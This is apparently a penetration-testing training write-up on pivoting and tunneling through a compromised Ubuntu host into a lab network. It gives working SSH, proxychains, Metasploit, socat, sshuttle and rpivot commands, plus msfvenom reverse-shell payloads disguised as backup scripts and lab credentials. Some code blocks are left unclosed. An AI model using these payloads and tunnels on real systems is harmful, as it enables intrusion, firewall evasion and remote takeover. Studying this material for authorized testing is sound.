# Pivoting, Tunneling, and Port Forwarding 
Port forwarding is a technique that allows us to redirect a communication request from one port to another. Port forwarding uses TCP as the primary communication layer to provide interactive communication for the forwarded port. However, different application layer protocols such as SSH or even SOCKS (non-application layer) can be used to encapsulate the forwarded traffic. This can be effective in bypassing firewalls and using existing services on your compromised host to pivot to other networks.

## SSH Local Port Forwarding

### Scanning the Pivot Target
```
nmap -sT -p22,3306 $rhost

PORT     STATE  SERVICE
22/tcp   open   ssh
3306/tcp closed mysql
```
The Nmap output shows that the SSH port is open. To access the MySQL service, we can either SSH into the server and access MySQL from inside the Ubuntu server, or we can port forward it to our localhost on port 1234 and access it locally. A benefit of accessing it locally is if we want to execute a remote exploit on the MySQL service, we won't be able to do it without port forwarding. This is due to MySQL being hosted locally on the Ubuntu server on port 3306. So, we will use the below command to forward our local port (1234) over SSH to the Ubuntu server.

### Executing the Local Port Forward
```
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
```
The -L command tells the SSH client to request the SSH server to forward all the data we send via the port 1234 to localhost:3306 on the Ubuntu server. By doing this, we should be able to access the MySQL service locally on port 1234. We can use Netstat or Nmap to query our local host on 1234 port to verify whether the MySQL service was forwarded.

### Confirming Port Forward with Netstat
```
netstat -antp | grep 1234

(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.1:1234          0.0.0.0:*               LISTEN      4034/ssh            
tcp6       0      0 ::1:1234                :::*                    LISTEN      4034/ssh   
```

### Confirming Port Forward with Nmap
```
nmap -v -sV -p1234 localhost

PORT     STATE SERVICE VERSION
1234/tcp open  mysql   MySQL 8.0.28-0ubuntu0.20.04.3
```

Similarly, if we want to forward multiple ports from the Ubuntu server to your localhost, you can do so by including the local port:server:port argument to your ssh command. For example, the below command forwards the apache web server's port 80 to your attack host's local port on 8080.

### Forwarding Multiple Ports
```
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```

### Enabling Dynamic Port Forwarding with SSH

```
ssh -D 9050 ubuntu@10.129.202.64
```
The -D argument requests the SSH server to enable dynamic port forwarding. Once we have this enabled, we will require a tool that can route any tool's packets over the port 9050. We can do this using the tool proxychains, which is capable of redirecting TCP connections through TOR, SOCKS, and HTTP/HTTPS proxy servers and also allows us to chain multiple proxy servers together. Using proxychains, we can hide the IP address of the requesting host as well since the receiving host will only see the IP of the pivot host. Proxychains is often used to force an application's TCP traffic to go through hosted proxies like SOCKS4/SOCKS5, TOR, or HTTP/HTTPS proxies.

To inform proxychains that we must use port 9050, we must modify the proxychains configuration file located at /etc/proxychains.conf. We can add socks4 127.0.0.1 9050 to the last line if it is not already there.

### Checking /etc/proxychains.conf
```
 tail -4 /etc/proxychains.conf
# meanwile
# defaults set to "tor"
socks4 	127.0.0.1 9050
```
Now when you start Nmap with proxychains using the below command, it will route all the packets of Nmap to the local port 9050, where our SSH client is listening, which will forward all the packets over SSH to the 172.16.5.0/23 network.

### Using Nmap with Proxychains
```
proxychains nmap -v -sn 172.16.5.1-200

ProxyChains-3.1 (http://proxychains.sf.net)

Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:30 EST

```

This part of packing all your Nmap data using proxychains and forwarding it to a remote server is called SOCKS tunneling. One more important note to remember here is that we can only perform a full TCP connect scan over proxychains. The reason for this is that proxychains cannot understand partial packets. If you send partial packets like half connect scans, it will return incorrect results. We also need to make sure we are aware of the fact that host-alive checks may not work against Windows targets because the Windows Defender firewall blocks ICMP requests (traditional pings) by default.

[A full TCP connect scan](https://nmap.org/book/scan-methods-connect-scan.html) without ping on an entire network range will take a long time. So, for this module, we will primarily focus on scanning individual hosts, or smaller ranges of hosts we know are alive, which in this case will be a Windows host at 172.16.5.19. We will perform a remote system scan using the below command.

### Enumerating the Windows Target through Proxychains
```
proxychains nmap -v -Pn -sT 172.16.5.19
```

### Using Metasploit with Proxychains
```
proxychains msfconsole
```
Let's use the rdp_scanner auxiliary module to check if the host on the internal network is listening on 3389.

### Using rdp_scanner Module
```
search rdp_scanner
use 0
set rhosts 172.16.5.19
run
```
Depending on the level of access we have to this host during an assessment, we may try to run an exploit or log in using gathered credentials. For this module, we will log in to the Windows remote host over the SOCKS tunnel. This can be done using xfreerdp. The user in our case is victor, and the password is pass@123

### Using xfreerdp with Proxychains
```
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

## Remote/Reverse Port Forwarding with SSH

### Creating a Windows Payload with msfvenom
```
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```

### Configuring & Starting the multi/handler
```
use exploit/multi/handler
```
Once our payload is created and we have our listener configured & running, we can copy the payload to the Ubuntu server using the scp command since we already have the credentials to connect to the Ubuntu server using SSH.

### Transferring Payload to Pivot Host
```
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
```
After copying the payload, we will start a python3 HTTP server using the below command on the Ubuntu server in the same directory where we copied our payload.

### Starting Python3 Webserver on Pivot Host
```
ubuntu@Webserver$ python3 -m http.server 8123
```

### Downloading Payload on the Windows Target
```
PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```
We can download this backupscript.exe on the Windows host via a web browser or the PowerShell cmdlet Invoke-WebRequest.

Once we have our payload downloaded on the Windows host, we will use SSH remote port forwarding to forward connections from the Ubuntu server's port 8080 to our msfconsole's listener service on port 8000. We will use -vN argument in our SSH command to make it verbose and ask it not to prompt the login shell. The -R command asks the Ubuntu server to listen on <targetIPaddress>:8080 and forward all incoming connections on port 8080 to our msfconsole listener on 0.0.0.0:8000 of our attack host.


### Using SSH -R
```
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

After creating the SSH remote port forward, we can execute the payload from the Windows target. If the payload is executed as intended and attempts to connect back to our listener, we can see the logs from the pivot on the pivot host.

### Viewing the Logs from the Pivot
```
ebug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61355

debug1: channel 0: new [172.16.5.19]
debug1: confirm forwarded-tcpip
debug1: channel 0: connected to 0.0.0.0 port 8000
```
 If all is set up properly, we will receive a Meterpreter shell pivoted via the Ubuntu server.

## Meterpreter Tunneling & Port Forwarding

Now let us consider a scenario where we have our Meterpreter shell access on the Ubuntu server (the pivot host), and we want to perform enumeration scans through the pivot host, but we would like to take advantage of the conveniences that Meterpreter sessions bring us. In such cases, we can still create a pivot with our Meterpreter session without relying on SSH port forwarding. We can create a Meterpreter shell for the Ubuntu server with the below command, which will return a shell on our attack host on port 8080.

### Creating Payload for Ubuntu Pivot Host
```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```
Before copying the payload over, we can start a *multi/handler*, also known as a Generic Payload Handler.
### Configuring & Starting the multi/handler
```
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8080
lport => 8080
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 0.0.0.0:8080 
```
We can copy the backupjob binary file to the Ubuntu pivot host over SSH and execute it to gain a Meterpreter session.

### Executing the Payload on the Pivot Host
```
ubuntu@WebServer:~$ ls

backupjob
ubuntu@WebServer:~$ chmod +x backupjob 
ubuntu@WebServer:~$ ./backupjob
```
We need to make sure the Meterpreter session is successfully established upon executing the payload.
### Meterpreter Session Establishment
```
[*] Sending stage (3020772 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened (10.10.14.18:8080 -> 10.129.202.64:39826 ) at 2022-03-03 12:27:43 -0500
meterpreter > pwd

/home/ubuntu
```
We know that the Windows target is on the 172.16.5.0/23 network. So assuming that the firewall on the Windows target is allowing ICMP requests, we would want to perform a ping sweep on this network.
### Ping Sweep
```
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

[*] Performing ping sweep for IP range 172.16.5.0/23
```
We could also perform a ping sweep using a for loop directly on a target pivot host that will ping any device in the network range we specify. 
### Ping Sweep For Loop on Linux Pivot Hosts
```
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```
### Ping Sweep For Loop Using CMD
```
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```
### Ping Sweep Using PowerShell
```
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```
*Note: It is possible that a ping sweep may not result in successful replies on the first attempt, especially when communicating across networks. This can be caused by the time it takes for a host to build its arp cache. In these cases, it is good to attempt our ping sweep at least twice to ensure the arp cache gets built.*

There could be scenarios when a host's firewall blocks ping (ICMP), and the ping won't get us successful replies. In these cases, we can perform a TCP scan on the 172.16.5.0/23 network with Nmap. Instead of using SSH for port forwarding, we can also use Metasploit's post-exploitation routing module socks_proxy to configure a local proxy on our attack host. We will configure the SOCKS proxy for SOCKS version 4a. This SOCKS configuration will start a listener on port 9050 and route all the traffic received via our Meterpreter session.

### Configuring MSF's SOCKS Proxy
```
msf6 > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
msf6 auxiliary(server/socks_proxy) > options

### Adding a Line to proxychains.conf if Needed

```
socks4 	127.0.0.1 9050
# Note: Depending on the version the SOCKS server is running, we may occasionally need to changes socks4 to socks5 in proxychains.conf. 
```

### Creating Routes with AutoRoute
```
msf6 > use post/multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0
msf6 post(multi/manage/autoroute) > run

[+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.
[*] Post module execution completed
```

It is also possible to add routes with autoroute by running autoroute from the Meterpreter session.

```
meterpreter > run autoroute -s 172.16.5.0/23

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64
[*] Use the -p option to list all active routes
```

After adding the necessary route(s) we can use the -p option to list the active routes to make sure our configuration is applied as expected.

### Listing Active Routes with AutoRoute
```
meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   172.16.5.0         255.255.254.0      Session 1
```

### Testing Proxy & Routing Functionality
```

```

## Port Forwarding

Port forwarding can also be accomplished using Meterpreter's portfwd module. We can enable a listener on our attack host and request Meterpreter to forward all the packets received on this port via our Meterpreter session to a remote host on the 172.16.5.0/23 network.

```
meterpreter > help portfwd

meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
[*] Local TCP relay created: :3300 <-> 172.16.5.19:3389
```

The above command requests the Meterpreter session to start a listener on our attack host's local port (-l) 3300 and forward all the packets to the remote (-r) Windows server 172.16.5.19 on 3389 port (-p) via our Meterpreter session. Now, if we execute xfreerdp on our localhost:3300, we will be able to create a remote desktop session.

### Connecting to Windows Target through localhost
```
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```
### Netstat Output
```
netstat -antp

tcp        0      0 127.0.0.1:54652         127.0.0.1:3300          ESTABLISHED 4075/xfreerdp 
```

## Meterpreter Reverse Port Forwarding

Similar to local port forwards, Metasploit can also perform reverse port forwarding with the below command, where you might want to listen on a specific port on the compromised server and forward all incoming shells from the Ubuntu server to our attack host. We will start a listener on a new port on our attack host for Windows and request the Ubuntu server to forward all requests received to the Ubuntu server on port 1234 to our listener on port 8081.

We can create a reverse port forward on our existing shell from the previous scenario using the below command. This command forwards all connections on port 1234 running on the Ubuntu server to our attack host on local port (-l) 8081. We will also configure our listener to listen on port 8081 for a Windows shell.

### Reverse Port Forwarding Rules

```
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

[*] Local TCP relay created: 10.10.14.18:8081 <-> :1234
```

### Configuring & Starting multi/handler
```
 bg

[*] Backgrounding session 1...
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081 
LPORT => 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:8081 
```

We can now create a reverse shell payload that will send a connection back to our Ubuntu server on 172.16.5.129:1234 when executed on our Windows host. Once our Ubuntu server receives this connection, it will forward that to attack host's ip:8081 that we configured.

### Generating the Windows Payload
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234

## Socat Redirection with a Reverse Shell

Socat is a bidirectional relay tool that can create pipe sockets between 2 independent network channels without needing to use SSH tunneling. It acts as a redirector that can listen on one host and port and forward that data to another IP address and port. We can start Metasploit's listener using the same command mentioned in the last section on our attack host, and we can start socat on the Ubuntu server.

### Starting Socat Listener
```
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```
Socat will listen on localhost on port 8080 and forward all the traffic to port 80 on our attack host (10.10.14.18). Once our redirector is configured, we can create a payload that will connect back to our redirector, which is running on our Ubuntu server. We will also start a listener on our attack host because as soon as socat receives a connection from a target, it will redirect all the traffic to our attack host's listener, where we would be getting a shell.

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```
Keep in mind that we must transfer this payload to the Windows host. We can use some of the same techniques used in previous sections to do so.

## Socat Redirection with a Bind Shell


Similar to our socat's reverse shell redirector, we can also create a socat bind shell redirector. This is different from reverse shells that connect back from the Windows server to the Ubuntu server and get redirected to our attack host. In the case of bind shells, the Windows server will start a listener and bind to a particular port. We can create a bind shell payload for Windows and execute it on the Windows host. At the same time, we can create a socat redirector on the Ubuntu server, which will listen for incoming connections from a Metasploit bind handler and forward that to a bind shell payload on a Windows target.

### Creating the Windows Payload

```
 msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
```

We can start a socat bind shell listener, which listens on port 8080 and forwards packets to Windows server 8443.
```
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

### Configuring & Starting the Bind multi/handler
```
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp

RHOST => 10.129.202.64
msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080
msf6 exploit(multi/handler) > run

## SSH for Windows: plink.exe

Plink, short for PuTTY Link, is a Windows command-line SSH tool that comes as a part of the PuTTY package when installed. Similar to SSH, Plink can also be used to create dynamic port forwards and SOCKS proxies. 

### Getting To Know Plink

The Windows attack host starts a plink.exe process with the below command-line arguments to start a dynamic port forward over the Ubuntu server. This starts an SSH session between the Windows attack host and the Ubuntu server, and then plink starts listening on port 9050.
```
plink -ssh -D 9050 ubuntu@10.129.15.50
```
Another Windows-based tool called Proxifier can be used to start a SOCKS tunnel via the SSH session we created. Proxifier is a Windows tool that creates a tunneled network for desktop client applications and allows it to operate through a SOCKS or HTTPS proxy and allows for proxy chaining. It is possible to create a profile where we can provide the configuration for our SOCKS server started by Plink on port 9050.

## SSH Pivoting with Sshuttle

Sshuttle is another tool written in Python which removes the need to configure proxychains. However, this tool only works for pivoting over SSH and does not provide other options for pivoting over TOR or HTTPS proxy servers. Sshuttle can be extremely useful for automating the execution of iptables and adding pivot rules for the remote host. 

One interesting usage of sshuttle is that we don't need to use proxychains to connect to the remote hosts. Let's install sshuttle via our Ubuntu pivot host and configure it to connect to the Windows host via RDP.

### Installing sshuttle
```
sudo apt-get install sshuttle -y
```

### Running sshuttle
```
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v

fw: iptables -w -t nat -A sshuttle-12300 -j REDIRECT --dest 172.16.5.0/32 -p tcp --to-ports 12300
```

With this command, sshuttle creates an entry in our iptables to redirect all traffic to the 172.16.5.0/23 network through the pivot host.

### Traffic Routing through iptables Routes
```
nmap -v -sV -p3389 172.16.5.19 -A -Pn # We can now use any tool directly without using proxychains.
```

## Web Server Pivoting with Rpivot
Rpivot is a reverse SOCKS proxy tool written in Python for SOCKS tunneling. Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side. We will take the scenario below, where we have a web server on our internal network (172.16.5.135), and we want to access that using the rpivot proxy.
We can start our rpivot SOCKS proxy server using the below command to allow the client to connect on port 9999 and listen on port 9050 for proxy pivot connections.

```
git clone https://github.com/klsecservices/rpivot.git
```

### Installing Python2.7
```
 sudo apt-get install python2.7
```
### Alternative Installation of Python2.7
```
curl https://pyenv.run | bash
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(pyenv init -)"' >> ~/.bashrc
source ~/.bashrc
pyenv install 2.7
pyenv shell 2.7
```
We can start our rpivot SOCKS proxy server to connect to our client on the compromised Ubuntu server using server.py.

### Running server.py from the Attack Host
```
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```
Before running client.py we will need to transfer rpivot to the target. We can do this using this SCP command:
### Transferring rpivot to the Target
```
scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```
### Running client.py from Pivot Target
```
ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999

Backconnecting to server 10.10.14.18 port 9999
```

### Confirming Connection is Established
```
New connection from host 10.129.202.64, source port 35226
```
We will configure proxychains to pivot over our local server on 127.0.0.1:9050 on our attack host, which was initially started by the Python server.

Finally, we should be able to access the webserver on our server-side, which is hosted on the internal network of 172.16.5.0/23 at 172.16.5.135:80 using proxychains and Firefox.

### Browsing to the Target Webserver using Proxychains
```
proxychains firefox-esr 172.16.5.135:80
```
Similar to the pivot proxy above, there could be scenarios when we cannot directly pivot to an external server (attack host) on the cloud. Some organizations have HTTP-proxy with NTLM authentication configured with the Domain Controller. In such cases, we can provide an additional NTLM authentication option to rpivot to authenticate via the NTLM proxy by providing a username and password. In these cases, we could use rpivot's client.py in the following way:

### Connecting to a Web Server using HTTP-Proxy & NTLM Auth
```
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```
